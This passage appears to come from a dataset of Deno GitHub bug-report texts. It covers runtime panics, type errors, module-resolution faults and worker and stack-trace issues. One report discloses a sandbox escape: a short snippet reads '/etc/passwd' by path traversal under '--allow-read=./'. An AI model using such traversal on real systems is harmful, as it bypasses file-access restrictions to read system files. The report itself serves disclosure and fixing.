`Deno.copyFile()`, `Deno.rename()` as `Deno.copyFile()` + `Deno.remove()`."},{"labels":["bug"],"text":"cc @kevinkassimo    \r\n\r\n\r\nmaybe Deno.execPath should be a function."},{"labels":["bug"],"text":"```\r\n> deno version\r\ndeno: 0.13.0\r\nv8: 7.7.200\r\ntypescript: 3.5.1\r\n> deno install gist https://deno.land/std/examples/gist.ts -A\r\nDownload https://deno.land/std@v0.11/installer/mod.ts\r\nthread 'tokio-runtime-worker-0' panicked at 'called `Result::unwrap()` on an `Err` value: Os { code: 13, kind: PermissionDenied, message: \"Permission denied\" }', src/libcore/result.rs:999:5\r\nnote: Run with `RUST_BACKTRACE=1` environment variable to display a backtrace.\r\nthread 'main' panicked at 'internal error: entered unreachable code', ../../third_party/rust_crates/registry/src/github.com-1ecc6299db9ec823/tokio-0.1.21/src/runtime/threadpool/mod.rs:296:26\r\nthread 'tokio-runtime-worker-3' panicked at 'unexpected state while aborting task: Complete', ../../third_party/rust_crates/registry/src/github.com-1ecc6299db9ec823/tokio-threadpool-0.1.14/src/task/mod.rs:216:21\r\n```"},{"labels":["bug"],"text":"The issue:\r\n```js\r\nconst passwd = Deno.readFileSync('./../../../../../../etc/passwd');\r\nconsole.log(new TextDecoder().decode(passwd));\r\n```\r\nsuccessfully reads `/etc/passwd` when run with `--allow-read=./` because [the whitelist check](https://github.com/denoland/deno/blob/master/cli/permissions.rs#L484) does not first [canonicalize](https://doc.rust-lang.org/std/path/struct.PathBuf.html#canonicalize.v) the path.\r\n\r\nWhile I discovered this issue, it was @nayeem-rahman who pointed out the cause when I brought up the bug in [the gitter chat](https://gitter.im/denolife/Lobby). I figured I should make an issue for it so that it could be tracked properly, especially considering it's a fairly major issue (Untrusted code that is meant to have access to only one directory has access to the whole file system)."},{"labels":["bug"],"text":"```js\r\nclass FooError extends Error\r\n{\r\n\tget message()\r\n\t{\r\n\t\treturn `dynamic message`;\r\n\t}\r\n}\r\n\r\nthrow new FooError();\r\n```\r\n\r\nIn Chrome and Node:\r\n```\r\nUncaught Error: dynamic message\r\n```\r\n\r\nIn deno (0.10.0):\r\n```\r\nUncaught Error\r\n```"},{"labels":["bug"],"text":"Here's an example program:\r\n```js\r\nconst global = new WebAssembly.Global({value:'i32', mutable:true}, 0);\r\nconst mem = new WebAssembly.Memory({initial:10, maximum:100});\r\n\r\nlet wasmImports = {\r\n  js: { global, mem },\r\n};\r\n\r\nasync function main() {\r\n  console.log(\" ok 1\");\r\n  let bytes = Deno.readFileSync('./global.wasm');\r\n  console.log(\" ok 2\");\r\n  window.wasm = await WebAssembly.instantiate(bytes, wasmImports)\r\n  console.log(\" ok 3\");\r\n}\r\n\r\nmain();\r\n```\r\nIt will never reach \"ok 3\"\r\n\r\nThe file `global.wasm` is produced from the following file `global.wat`:\r\n```wat\r\n(module\r\n  (global $g (import \"js\" \"global\") (mut i32))\r\n  (import \"js\" \"mem\" (memory 1))\r\n  (func (export \"getGlobal\") (result i32)\r\n        (global.get $g))\r\n  (func (export \"incGlobal\")\r\n        (global.set $g\r\n                    (i32.add (global.get $g) (i32.const 15))))\r\n  (func (export \"retSize\") (result i32)\r\n        (memory.size)\r\n  )\r\n)\r\n```\r\nby running `wat2wasm global.wat`"},{"labels":["bug"],"text":"```typescript\r\nlet response = await fetch(url);\r\nfor await (let chunk of response.body) {\r\n  // ...\r\n}\r\n```\r\n\r\nCurrently failing with `error TS2504: Type 'Body' must have a '[Symbol.asyncIterator]()' method that returns an async iterator.`"},{"labels":[null,"bug"],"text":"![edge_benchmarks](https://user-images.githubusercontent.com/80/59380054-181a9f80-8d0d-11e9-851b-d2d7f75d6578.PNG)\r\n"},{"labels":["bug"],"text":"```js\r\n// file: main.js\r\nlet worker = new Worker(\"./worker.js\");\r\nworker.postMessage(\"hello\");\r\nconsole.log(\"finished main thread\");\r\n```\r\n\r\n```js\r\n// file: worker.js\r\nonmessage = (e) => {\r\n  console.log(\"worker recieved message\", e.data);\r\n  new DoesNotExist();\r\n  console.log(\"end worker\");\r\n}\r\n```\r\n\r\n```\r\n$ deno run main.js\r\nfinished main thread\r\nworker recieved message hello\r\n```\r\n\r\nThere should be a crash message here, right? Here's what Chrome says:\r\n\r\n```\r\nfinished main thread\r\nworker recieved message hello\r\nUncaught ReferenceError: DoesNotExist is not defined\r\n    at onmessage (worker.js:3)\r\n```"},{"labels":["bug"],"text":"```javascript\r\n(async ()=> {\r\n\tconst process= Deno.run( { cmd: [ 'invalid-command', ], }, );\r\n\t\r\n\tconsole.log( await process.status(), );\r\n})();\r\n```\r\n\r\nIt should log { code: 127, success: false }. But in fact, an error thrown."},{"labels":["bug"],"text":"```typescript\r\n// server.ts\r\nimport { serve } from \"https://deno.land/std/http/server.ts\";\r\n\r\nasync function main() {\r\n  for await (let req of serve(\":80\")) {\r\n    console.log(req.proto, req.method, req.url);\r\n    req.respond({});\r\n  }\r\n}\r\n\r\nmain();\r\n```\r\n\r\n```typescript\r\n// test.ts\r\nasync function main() {\r\n  let enc = new TextEncoder();\r\n  let conn = await Deno.dial(\"tcp\", \":80\");\r\n  conn.write(enc.encode(\"GET / HTTP/1.0\\n\"));\r\n  conn.close();\r\n}\r\n\r\nmain();\r\n```\r\n\r\nRan `server.ts`, then ran `test.ts` in another window:\r\n\r\n```\r\n❯ deno run --allow-net test.ts\r\n[1/1] Compiling file:///Users/marktiedemann/dev/deno_test/test.ts\r\nthread '<unnamed>' panicked at 'bad rid', ../../cli/resources.rs:237:15\r\nnote: Run with `RUST_BACKTRACE=1` environment variable to display a backtrace.\r\nthread 'main' panicked at 'internal error: entered unreachable code', ../../third_party/rust_crates/registry/src/github.com-1ecc6299db9ec823/tokio-0.1.20/src/runtime/threadpool/mod.rs:296:26\r\nthread 'main' panicked at 'unexpected state while aborting task: Complete', ../../third_party/rust_crates/registry/src/github.com-1ecc6299db9ec823/tokio-threadpool-0.1.14/src/task/mod.rs:216:21\r\nstack backtrace:\r\n   0:        0x10c034ab3 - <std::sys::unix::backtrace::tracing::imp::UnwindError as core::fmt::Display>::fmt::h91279d169ccb5b2c\r\n   1:        0x10c02d6f2 - std::sys_common::alloc::realloc_fallback::h1ea3e7dd66f55875\r\n   2:        0x10c031056 - std::panicking::take_hook::hf5878833b3146ef1\r\n   3:        0x10c030d61 - std::panicking::take_hook::hf5878833b3146ef1\r\n   4:        0x10c0317cf - std::panicking::rust_panic_with_hook::h547ea459e27be908\r\n   5:        0x10c0312fc - std::panicking::begin_panic_fmt::hcacc0f82ca07e29f\r\n   6:        0x10c031250 - std::panicking::begin_panic_fmt::hcacc0f82ca07e29f\r\n   7:        0x10ce47c76 - <tokio_threadpool::task::Task::run::{{closure}}::Guard<'a> as core::ops::drop::Drop>::drop::h3e4ab556eba4c96c\r\n   8:        0x10ce41e59 - tokio_threadpool::pool::state::<impl core::convert::From<tokio_threadpool::pool::state::Lifecycle> for usize>::from::h025a5dce3d6dcb6a\r\n   9:        0x10ce499be - <tokio_threadpool::shutdown::ShutdownTrigger as core::ops::drop::Drop>::drop::hefa5d5ec07d4e8ed\r\n  10:        0x10ce431db - <tokio_threadpool::worker::state::Lifecycle as core::fmt::Debug>::fmt::he88a1c5c815cc32d\r\n  11:        0x10ce3d089 - tokio_threadpool::thread_pool::ThreadPool::shutdown_now::h6b270460ce9a5a1a\r\n  12:        0x10ce1d8bc - tokio::runtime::current_thread::runtime::Runtime::run::hd4ea896f4ae076a4\r\n  13:        0x10ce20160 - <tokio::runtime::threadpool::Runtime as core::ops::drop::Drop>::drop::h06f07afe0cfb18e8\r\n  14:        0x10d0606fb - unicode_normalization::normalize::is_hangul_syllable::h3690a31bd91fba4a\r\n  15:        0x10d135194 - unicode_normalization::normalize::is_hangul_syllable::h3690a31bd91fba4a\r\n  16:        0x10d042b55 - unicode_normalization::normalize::is_hangul_syllable::h3690a31bd91fba4a\r\n  17:        0x10c031167 - std::panicking::update_panic_count::hbf086650ecde3007\r\n  18:        0x10c0414be - __rust_maybe_catch_panic\r\n  19:        0x10c031c4d - std::rt::lang_start_internal::he82d111f45e8971a\r\n  20:        0x10d1359f8 - main\r\nthread panicked while panicking. aborting.\r\nzsh: illegal hardware instruction  deno run --allow-net test.ts\r\n```\r\n\r\nWhen changing the addr to `\"localhost:80\"`, the panic is gone and a proper error is printed instead:\r\n\r\n```\r\nUncaught ConnectionRefused: Connection refused (os error 61)\r\n    at DenoError (js/errors.ts:22:5)\r\n    at maybeError (js/errors.ts:33:12)\r\n    at handleAsyncMsgFromRust (js/dispatch.ts:41:17)\r\n    at handleAsyncMsgFromRust (shared_queue.js:157:9)\r\n```"},{"labels":["bug"],"text":"```\r\n❯ deno run does-not-exist.ts\r\nCannot resolve module \"file:///<redacted>/does-not-exist.ts\" from \".\"\r\nCannot resolve module \"file:///<redacted>/does-not-exist.ts\" from \".\"\r\n```"},{"labels":["bug"],"text":"Here's a minimal example: Run the test http server (`tools/http_server.py`) in the background and call\r\n```\r\n./target/debug/deno run --reload http://localhost:4545/tests/003_relative_import.ts\r\n```\r\nYou'll see this:\r\n```\r\n> ./tools/http_server.py\r\nDeno test server http://localhost:4545/\r\nredirect server http://localhost:4546/ -> http://localhost:4545/\r\nredirect server http://localhost:4547/ -> http://localhost:4545/\r\nredirect server http://localhost:4548/ -> http://localhost:4546/\r\n127.0.0.1 - - [14/May/2019 00:08:10] \"GET /tests/003_relative_import.ts HTTP/1.1\" 200 -\r\n127.0.0.1 - - [14/May/2019 00:08:10] \"GET /tests/003_relative_import.ts HTTP/1.1\" 200 -\r\n127.0.0.1 - - [14/May/2019 00:08:10] \"GET /tests/subdir/print_hello.ts HTTP/1.1\" 200 -\r\n127.0.0.1 - - [14/May/2019 00:08:12] \"GET /tests/subdir/print_hello.ts HTTP/1.1\" 200 -\r\n127.0.0.1 - - [14/May/2019 00:08:12] \"GET /tests/subdir/print_hello.ts HTTP/1.1\" 200 -\r\n```\r\nSomehow we need to in code this into a Rust unit test. Potentially by using [the Progress bar history](https://github.com/denoland/deno/blob/5e56e26c8baad08954cdc3ecac34923dcdc39c12/cli/progress.rs#L28) (easy) or by mocking out the server (hard)\r\n\r\nThe actual bug is likely in [`op_fetch_module_meta_data()`](https://github.com/denoland/deno/blob/5e56e26c8baad08954cdc3ecac34923dcdc39c12/cli/ops.rs#L452). It's probably a one line fix. The challenge is to test for this well."},{"labels":["bug"],"text":"The http server will crash if it has an incoming https request, with this error:\r\n> Uncaught ProtocolError: malformed MIME header line\r\n\r\nIn http lib's `readRequest` this line causes the error:\r\n`[req.headers, err] = await tp.readMIMEHeader()`\r\n\r\nIt's trying to read the https request, but since it's encrypted it fails at doing this. But there should be a way to detect such requests and just deny them without crashing the server."},{"labels":["bug"],"text":"I have the two following modules:\r\n\r\n```javascript\r\n// external.ts\r\nexport default external = \"external\";\r\n\r\n// fail.ts\r\nimport external from \"external.ts\";\r\nconsole.log(external);\r\n```\r\nThen:\r\n```\r\n$ deno run fail.ts\r\nCompiling file:///home/user/fail.ts\r\nrelative URL with a cannot-be-a-base base\r\n```\r\nThis error message is very unclear. It should at least mention the file and the line number of the import."},{"labels":["bug"],"text":"Haven't read the spec lately but this did look strange to me...\r\n\r\nhttps://github.com/denoland/deno/blob/1f7ad17152c03b140c997590c897b89fbfea7cea/js/blob.ts#L98-L101\r\n\r\nTested this in the browser\r\n\r\n```js\r\ntype = new TextDecoder().decode(crypto.getRandomValues(new Uint8Array(5)))\r\nblob = new Blob([])\r\nblob.slice(0,0,type)\r\n```\r\n\r\nit just sets the type to empty string `\"\"`"},{"labels":["bug"],"text":"```\r\n> curl https://api.github.com/repos/denoland/deno/releases | deno eval \"b = await Deno.readAll(Deno.stdin); console.log(b)\"\r\n  % Total    % Received % XferdCannot resolve module \"file:///home/ryan/src/deno/eval\" from \".\"\r\n  Average Speed   Time    Time     Time  Current\r\n                                 Dload  Upload   Total   Spent    Left  Speed\r\n  1  214k    1  4337    0     0  13945      0  0:00:15 --:--:--  0:00:15 13900\r\ncurl: (23) Failed writing body (1129 != 1370)\r\n```\r\n\r\nNot sure what's happening there."},{"labels":["bug"],"text":"I don't think `fetch_test.ts` is running properly, it seems like all the tests defined with `testPerm` are getting ignored. None of them even show up in the appveyor logs.\r\n\r\n![image](https://user-images.githubusercontent.com/7724/57056645-65651500-6c69-11e9-98fd-15b5302ee22b.png)\r\n"},{"labels":["bug"],"text":"Deno panics and hard crash on opening too many files, aka fildes count exceeding `ulimit -n`. Ideally it should throw a user space error instead.\r\n```\r\nthread '<unnamed>' panicked at 'called `Result::unwrap()` on an `Err` value: Os { code: 24, kind: Other, message: \"Too many open files\" }', src/libcore/result.rs:997:5\r\nnote: Run with `RUST_BACKTRACE=1` environment variable to display a backtrace.\r\nthread 'main' panicked at 'internal error: entered unreachable code', ../../third_party/rust_crates/registry/src/github.com-1ecc6299db9ec823/tokio-0.1.19/src/runtime/threadpool/mod.rs:293:26\r\nthread '<unnamed>' panicked at 'unexpected state while aborting task: Complete', ../../third_party/rust_crates/registry/src/github.com-1ecc6299db9ec823/tokio-threadpool-0.1.14/src/task/mod.rs:216:21\r\n```\r\n\r\n(Might have been a Tokio problem though)"},{"labels":["bug"],"text":"@ry I noticed today at js.la you had to use `-A` to make the file server demo work. Something with some malformed header and unicode data. Just wanted to keep this posted as it wasn't already afaik :)\r\n\r\nGreat presentation Ryan, I love the work you're doing at Deno and I'm excited to use it for javascript sandboxing! Thanks!"},{"labels":["bug"],"text":"despite this integration test:\r\nhttps://github.com/denoland/deno/blob/master/tests/types.test\r\n```\r\n./tools/build.py && ./tools/integration_tests.py --filter types.test\r\n```\r\npasses"},{"labels":["bug"],"text":"run deno then \r\n```\r\n$ deno\r\n> Deno = 'a'\r\na\r\nthread 'tokio-runtime-worker-0' panicked at 'assertion failed: `(left == right)`\r\n  left: `1`,\r\n right: `0`', ../../core/isolate.rs:486:9\r\nnote: Run with `RUST_BACKTRACE=1` environment variable to display a backtrace.\r\n```\r\n==================================================================\r\n\r\n./target/debug/deno\r\n> eval(\"var a =12; console.log(window.a)\")\r\n12\r\nundefined\r\n\r\n./target/debug/deno eval \"var a =12; console.log(window.a)\"\r\nundefined\r\n\r\n"},{"labels":["bug"],"text":"I've been trying to run Deno on an Ubuntu server but I'm finding that it hangs on reading the file it's running. I initially was trying to run this on the `maxmcd/deno` docker image. I then tried installing/running Deno on the machine itself and ran into the same issue.\r\n\r\nI'm a little out of my depth to debug this so any guidance would be appreciated.\r\n\r\nUbuntu version 18.04.2 LTS (Bionic Beaver)\r\n\r\n```\r\n> echo 'console.log(\"foo\")' > foo.ts\r\n> ./.deno/bin/deno --version\r\ndeno: 0.3.7\r\nv8: 7.4.238\r\ntypescript: 3.4.1\r\n> ./.deno/bin/deno -AD foo.ts\r\nDEBUG RS - mkdir -p /home/piet/.cache/deno/gen\r\nDEBUG RS - set dir perm to 493\r\nDEBUG RS - mkdir -p /home/piet/.cache/deno/deps\r\nDEBUG RS - set dir perm to 493\r\nDEBUG RS - mkdir -p /home/piet/.cache/deno/deps/http\r\nDEBUG RS - set dir perm to 493\r\nDEBUG RS - mkdir -p /home/piet/.cache/deno/deps/https\r\nDEBUG RS - set dir perm to 493\r\nDEBUG RS - root /home/piet/.cache/deno\r\nDEBUG RS - gen /home/piet/.cache/deno/gen\r\nDEBUG RS - deps /home/piet/.cache/deno/deps\r\nDEBUG RS - deps_http /home/piet/.cache/deno/deps/http\r\nDEBUG RS - deps_https /home/piet/.cache/deno/deps/https\r\nDEBUG RS - Deno isolate init with snapshots.\r\nDEBUG RS - resolve_module specifier foo.ts referrer .\r\nDEBUG RS - msg_from_js Start sync true\r\nDEBUG JS - cwd /home/piet\r\nDEBUG JS - args [ \"foo.ts\" ]\r\nDEBUG RS - resolve_module specifier foo.ts referrer .\r\nDEBUG RS - main_module file:///home/piet/foo.ts\r\nDEBUG RS - fetch_module_meta_data. specifier file:///home/piet/foo.ts referrer .\r\nDEBUG RS - resolve_module specifier file:///home/piet/foo.ts referrer .\r\nDEBUG RS - module_name: file:///home/piet/foo.ts, filename: /home/piet/foo.ts\r\nDEBUG RS - fetch local or reload file:///home/piet/foo.ts is_module_remote false\r\nDEBUG RS - found local source\r\n```\r\n\r\nThen it hangs indefinitely.\r\n\r\nLet me know what other info I can provide."},{"labels":["bug"],"text":"Apparently we are swallowing errors when the compile thread crashes.\r\n\r\nLikely this is caused by [Tokio's panic swallowing \"feature\"](https://github.com/denoland/deno/issues/1311)\r\n\r\n```\r\ntest deno_dir::tests::test_get_source_code_4 ... ok\r\nmsg from main script hi\r\nafter postMessage\r\nmsg from main script exit\r\nthread '\r\ntokio-runtime-worker-0' panicked at 'called `Result::unwrap()` on an `Err` value: SpawnError { is_shutdown: true }', src\\libcore\\result.rs:997:5\r\nstack backtrace:\r\n   0:     0x7ff6317ef3cd - <unknown>\r\n  \r\n 1\r\n: \r\n  \r\n \r\n 0x\r\n7ff6317f2858 - <unknown>\r\n  \r\n \r\n2: \r\n  \r\n \r\n \r\n0x\r\n7ff6317f24d0\r\n - <unknown>\r\n  \r\n \r\n3: \r\n \r\n \r\n \r\n \r\n0x\r\n7ff6317f30df\r\n - <unknown>\r\n  \r\n \r\n4\r\n:  \r\n \r\n \r\n \r\n0x\r\n7ff6317f2c13\r\n - \r\n<unknown>\r\n  \r\n \r\n5\r\n: \r\n \r\n \r\n \r\n \r\n0x\r\n7ff6317f2af8\r\n - \r\n<unknown>\r\n  \r\n \r\n6\r\n: \r\n \r\n \r\n \r\n \r\n0x\r\n7ff6318014fb\r\n - \r\n<unknown>\r\n  \r\n \r\n7\r\n: \r\n \r\n \r\n \r\n \r\n0x\r\n7ff6315afc5c\r\n - \r\n<unknown>\r\n  \r\n \r\n8\r\n: \r\n \r\n \r\n \r\n \r\n0x\r\n7ff631657737\r\n - \r\n<unknown>\r\n  \r\n \r\n9\r\n: \r\n \r\n \r\n \r\n \r\n0x\r\n7ff631659b93\r\n - \r\n<unknown>\r\n  \r\n10\r\n: \r\n \r\n \r\n \r\n \r\n0x\r\n7ff63166a206\r\n - \r\n<unknown>\r\n  \r\n11\r\n: \r\n \r\n \r\n \r\n \r\n0x\r\n7ff631691236\r\n - \r\n<unknown>\r\n  \r\n12\r\n:     0x7ff6315feb53 - <unknown>\r\n  13:     0x7ff63187a9cf - <unknown>\r\n  14:    \r\n 0x7ff6318658f4 - <unknown>\r\n  15:     0x7ff6318c0b41 - <unknown>\r\n  16:     0x7ff6318665fe - <unknown>\r\n  17:     0x7ff6316c8a48 - <unknown>\r\n  18:     0x7ff6316c81d0 - <unknown>\r\n  19:     0x7ff6317a3322 - <unknown>\r\n  20:     0x7ff63186a51e - <unknown>\r\n  21:     0x7ff631869fb5 - <unknown>\r\n  22:     0x7ff631870c67 - <unknown>\r\n  23:     0x7ff6317a2a56 - <unknown>\r\n  24\r\n:     0x7ff6317a2244 - <unknown>\r\n  25:     0x7ff631865436 - <unknown>\r\n  26:     0x7ff63186584e - <unknown>\r\n  27:     0x7ff6318c0b41 - <unknown>\r\n  28:     0x7ff63175b380 - <unknown>\r\n  29:     0x7ff6317fce84 - <unknown>\r\n  30:     0x7ffca23f8363 - \r\nBaseThreadInitThunk\r\n  31:     0x7ffca2ade850 - RtlUserThreadStart\r\ntest worker::tests::test_worker_messages ... ok\r\n\r\n```\r\n\r\nLikely the fix is to reintroduce this:\r\n```\r\n  std::panic::set_hook(Box::new(|panic_info| {\r\n    eprintln!(\"{}\", panic_info.to_string());\r\n    std::process::abort();\r\n  }));\r\n```"},{"labels":["bug"],"text":"@cdata [reported](https://twitter.com/0xcda7a/status/1112108089568722944) the following resolution error for a module graph that fully resolves in Chrome:\r\n\r\n```\r\n$ deno --info https://unpkg.com/@google/model-viewer@0.1.2/lib/model-viewer.js?module\r\nDownloading https://unpkg.com/@google/model-viewer@0.1.2/lib/model-viewer.js?module\r\nDownloading https://unpkg.com/@google/model-viewer@0.1.2/lib/features/animation.js?module\r\nDownloading https://unpkg.com/lit-element@^2.0.0?module\r\nDownloading https://unpkg.com/lit-html@^1.0.0?module\r\nDownloading https://unpkg.com/lib/default-template-processor.js?module\r\nCannot resolve module \"./lib/default-template-processor.js?module\" from \"https://unpkg.com/lit-html@^1.0.0?module\"\r\n```"},{"labels":["bug"],"text":"https://github.com/denoland/deno_std/pull/297\r\n\r\nIt hangs after 19 minutes and prints \"WARNING the sharedQueue overflowed\" \r\n(The warning isn't necessarily a bad thing but is perhaps a hint)"},{"labels":["bug"],"text":"The following crashes in v0.3.0:\r\n```ts\r\nconst { DenoError } = Deno;\r\nconst e = {};\r\ne as DenoError;\r\nconsole.log(\"ok\");\r\n```\r\nWith the following error\r\n```\r\n> deno tests/deno_error.ts\r\nCompiling file:///Users/rld/src/deno/tests/deno_error.ts\r\n/Users/rld/src/deno/tests/deno_error.ts:3:6 - error TS2304: Cannot find name 'DenoError'.\r\n\r\n3 e as DenoError;\r\n       ~~~~~~~~~\r\n```\r\n\r\ncc @kitsonk \r\nref https://github.com/denoland/deno_std/pull/205\r\n\r\n"},{"labels":["bug"],"text":"Apparently web browsers don't allow this:\r\n```js\r\nimport 'bar.js'\r\n```\r\nChrome: `Uncaught TypeError: Failed to resolve module specifier \"bar.js\". Relative references must start with either \"/\", \"./\", or \"../\".`\r\nFirefox: `TypeError: Error resolving module specifier: bar.js`\r\nSafari: `TypeError: Module specifier does not start with \"/\", \"./\", or \"../\".`\r\n\r\nThanks to @thgh [for reporting this](https://github.com/denoland/deno/issues/1750#issuecomment-463129189).\r\n\r\nDoes anyone have a reference to the standard spec that states this?\r\n\r\nWe should also error on this. We're currently doing this all over the place."},{"labels":["bug"],"text":"```ts\r\nconsole.log(import.meta.url);\r\n```\r\nExample\r\n\r\n```\r\n> ./target/debug/deno import_meta.ts\r\nCompiling /Users/rld/src/deno/import_meta.ts\r\n/Users/rld/src/deno/import_meta.ts:1:25 - error TS2339: Property 'url' does not exist on type 'ImportMeta'.\r\n\r\n1 console.log(import.meta.url);\r\n                          ~~~\r\n```"},{"labels":["bug"],"text":"There is currently a difference in behavior when importing a relative path from a remote module behind a redirect.\r\n\r\nDeno resolves based on initial remote module URL.\r\nBrowser resolves based on final remote module URL.\r\n\r\nExample: `https://unpkg.com/example` redirects to `https://unpkg.com/example@0.2.0/cli.ts` and imports `./example.ts`\r\n\r\nDeno says `Cannot resolve module \"./example.ts\" from \".../deps/https/unpkg.com/example\"`\r\nBrowser fetches `https://unpkg.com/example@0.2.0/example.ts`\r\n\r\n"},{"labels":["bug"],"text":"Example:\r\n`caught_error.ts`:\r\n```ts\r\ninterface A {\r\n  a: number;\r\n}\r\n\r\ntry {\r\n  throw new Error(\"HELLO\")\r\n} catch (e) {\r\n  console.log(e);\r\n}\r\n```\r\ncompiled code:\r\n```js\r\ntry {\r\n    throw new Error(\"HELLO\");\r\n}\r\ncatch (e) {\r\n    console.log(e);\r\n}\r\n//# sourceMappingURL=caught_error.js.map\r\n//# sourceURL=/Users/kevinqian/Desktop/Programming/Deno/test/caught_error.ts\r\n```\r\nOutput:\r\n```\r\nError: HELLO\r\n    at /Users/kevinqian/Desktop/Programming/Deno/test/caught_error.ts:2:11\r\n```\r\nNotice the error message follows the location of compiled JS code, instead of the TS source.\r\n\r\nIn comparison,\r\n`uncaught_error.ts`:\r\n```ts\r\ninterface A {\r\n  a: number;\r\n}\r\n\r\nthrow new Error(\"HELLO\")\r\n```\r\ncompiled code:\r\n```js\r\nthrow new Error(\"HELLO\");\r\n//# sourceMappingURL=uncaught_error.js.map\r\n//# sourceURL=/Users/kevinqian/Desktop/Programming/Deno/test/uncaught_error.ts\r\n```\r\noutput:\r\n```\r\n/Users/kevinqian/Desktop/Programming/Deno/test/uncaught_error.ts:1:6\r\nthrow new Error(\"HELLO\");\r\n\r\nUncaught Error: HELLO\r\n    at file:///Users/kevinqian/Desktop/Programming/Deno/test/uncaught_error.ts:5:7\r\n```\r\nNotice that the first line points to compiled JS code, yet the error string points to the source TS code."},{"labels":["bug",null],"text":"In discussion of a [StackOverflow question](https://stackoverflow.com/questions/54506135/how-is-deno-startup-fast-without-running-the-typescript-compiler-in-watch-mode/) it reminded me have a situation we don't handle well, which could result in runtime errors (or unexpected behaviour).\r\n\r\nThe scenario is as follows:\r\n\r\n- There are two modules `a.ts` and `b.ts`\r\n- `b.ts` exports a value that is consumed by `a.ts`, which is a \"main\" module\r\n- Deno is run as `deno a.ts`\r\n  - Both `a.ts` and `b.ts` are transpiled and cached\r\n  - `a.js` and `b.js` are injected into the runtime\r\n- Changes are made to `b.ts` that remove the export\r\n- Deno is run as `deno a.ts` again\r\n  - Deno invalidates the cache of `b.ts` and recompiles it\r\n  - `a.js` and `b.js` are injected into the runtime\r\n  - `a.js` fails at runtime because the export is no longer available in `b.js`\r\n\r\nWe need some sort of reverse dependency graph that we would need to persist along with the cached outputs, so we could determine if `b.ts` is invalidated that any modules that depend upon `b.ts` should also be invalidated.\r\n\r\nThis is a longterm issue to fix, not something that can be easily addressed, we still have some work to do in cleaning up the compiler and how we deal with modules, and how we cache modules before we would want to tackle this.  It is just a reminder to not forget it."},{"labels":["bug"],"text":"Here I am trying to upload a 70M \r\n```\r\n> dd if=/dev/zero of=70mb_file.bin count=70 bs=1048576\r\n> ls -lh 70mb_file.bin\r\n-rw-rw-r-- 1 ryan ryan 70M Feb  5 16:01 70mb_file.bin\r\n> deno -A  https://deno.land/std/examples/gist.ts 70mb_file.bin\r\n\r\n<--- Last few GCs --->\r\n\r\n[13953:0x7f9dd4c60840]    19444 ms: Mark-sweep 944.5 (947.7) -> 944.5 (947.7) MB, 149.3 / 0.0 ms  (average mu = 0.794, current mu = 0.000) last resort GC in old space requested\r\n[13953:0x7f9dd4c60840]    19593 ms: Mark-sweep 944.5 (947.7) -> 944.5 (947.7) MB, 149.1 / 0.0 ms  (average mu = 0.652, current mu = 0.000) last resort GC in old space requested\r\n\r\n\r\n<--- JS stacktrace --->\r\n\r\n==== JS stack trace =========================================\r\n\r\n    0: ExitFrame [pc: 0x26d524b]\r\nSecurity context: 0x3e6e8533bfd1 <JSObject>\r\n    1: decode [0x3e6e85325981] [gen/bundle/main.js:~4534] [pc=0x38474ad3f264](this=0x3e6e8534c129 <TextDecoder map = 0x3ec974710589>,0x3e6e8534c059 <Uint8Array map = 0x3ec9747039c9>,0x3810db7804d1 <undefined>)\r\n    2: arguments adaptor frame: 1->2\r\n    3: main(aka main) [0x3e6e8534bd59] [/home/ryan/.deno/deps/https/deno.land/x/examples/gist.ts:23] [bytecode=0x3e6e8...\r\n\r\n\r\n#\r\n# Fatal javascript OOM in CALL_AND_RETRY_LAST\r\n#\r\n\r\nIllegal instruction\r\n```"},{"labels":["bug"],"text":"In cleaning up the compiler, I noticed while passing the `--recompile` flag with debug, that Rust will still attempt to load the local cache of a file even though it should \"know\" that it is not going to be used.  For example:\r\n\r\n```\r\nDEBUG JS - args [ \"tests/005_more_imports.ts\" ]\r\nDEBUG RS - code_fetch. specifier tests/005_more_imports.ts referrer .\r\nDEBUG RS - resolve_module specifier tests/005_more_imports.ts referrer .\r\nDEBUG RS - module_name: /Users/kkelly/github/deno/tests/005_more_imports.ts, filename: /Users/kkelly/github/deno/tests/005_more_imports.ts\r\nDEBUG RS - fetch local or reload /Users/kkelly/github/deno/tests/005_more_imports.ts is_module_remote false\r\nDEBUG RS - found local source \r\nDEBUG RS - load_cache code: /Users/kkelly/.deno/gen/e74a8e8c25c18115805245674c5d1a615441f4b7.js map: /Users/kkelly/.deno/gen/e74a8e8c25c18115805245674c5d1a615441f4b7.js.map\r\n```\r\n"},{"labels":["bug"],"text":"Running\r\n`deno https://deno.land/thumb.ts` gives a `SyntaxError: Unexpected indetifier`"},{"labels":["bug"],"text":"It took me a while to narrow it down, but I had been noticing that stack traces a lot of the time were not remapping properly and I was able to narrow down a reproduction.\r\n\r\nIt requires at least two modules, where one of the modules has type annotations that are getting erased.  So given:\r\n\r\n**a.ts**\r\n\r\n```ts\r\nexport interface Foo {\r\n  a: string;\r\n  b: string;\r\n}\r\n\r\nexport function foo(): number {\r\n  return (undefined as any).indexOf();\r\n}\r\n```\r\n\r\n**a_test.ts**\r\n\r\n```ts\r\nimport { test, assert } from \"https://deno.land/x/std/testing/mod.ts\";\r\nimport { foo } from \"./a.ts\";\r\n\r\ntest(function test() {\r\n  assert.equal(foo(), 0);\r\n});\r\n```\r\n\r\nI get the following failure and stack trace:\r\n\r\n```\r\n$ deno a_test.ts\r\nCompiling /Users/kkelly/github/deno_std/a_test.ts\r\nrunning 1 tests\r\ntest test ... FAILED\r\nTypeError: Cannot read property 'indexOf' of undefined\r\n    at foo (/Users/kkelly/github/deno_std/a.ts:2:22)\r\n    at test (/Users/kkelly/github/deno_std/a_test.ts:4:18)\r\n    at runTests (/Users/kkelly/.deno/deps/https/deno.land/x/std/testing/mod.ts:154:19)\r\n    at fire (gen/bundle/main.js:7628:7)\r\n\r\ntest result: FAILED. 0 passed; 1 failed; 0 ignored; 0 measured; 0 filtered out\r\n\r\n/Users/kkelly/.deno/deps/https/deno.land/x/std/testing/mod.ts:181:18\r\n            throw new Error(`There were ${failed} test failures.`);\r\n\r\nError: There were 1 test failures.\r\n    at setTimeout (file:///Users/kkelly/.deno/deps/https/deno.land/x/std/testing/mod.ts:245:13)\r\n    at fire (deno/js/timers.ts:131:3)\r\n```\r\n\r\nIn particular it is saying the error occurred at `a.ts:2:22` which should be `a.ts:7.29`.\r\n\r\nIf `a.ts` doesn't have types, that are erased, then the mapping isn't wrong.  If there is only a single module involved, even if that module exports something and contains erased types, then the mapping isn't wrong."},{"labels":["bug"],"text":"Basically, assume we have a file `1.ts`:\r\n```\r\nimport 